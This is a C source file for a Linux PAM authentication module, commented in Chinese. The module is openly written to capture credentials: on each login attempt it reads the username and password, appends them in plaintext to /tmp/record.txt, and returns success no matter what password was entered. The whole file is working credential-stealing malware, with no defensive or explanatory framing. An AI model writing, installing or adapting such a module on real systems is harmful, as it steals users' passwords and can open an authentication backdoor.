#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PAM_SM_AUTH
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <unistd.h>

#define STOREPATH "/tmp/record.txt" // 保存账户与密码的文件

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
	int retval;
	const char* username;
	const char* password;
	FILE *fp = NULL;

	retval = pam_get_user(pamh, &username, NULL);                 // 获得用户名，即 账户
	if (retval != PAM_SUCCESS) {
		return retval;
	}

	retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL); // 获得密码
	if (retval != PAM_SUCCESS) {
		return retval;
	}

	fp = fopen(STOREPATH, "a+");
	fprintf(fp, "%s：%s\n", username, password); // 将账户与密码写入STOREPATH文件中
	fclose(fp);

	return PAM_SUCCESS;
}
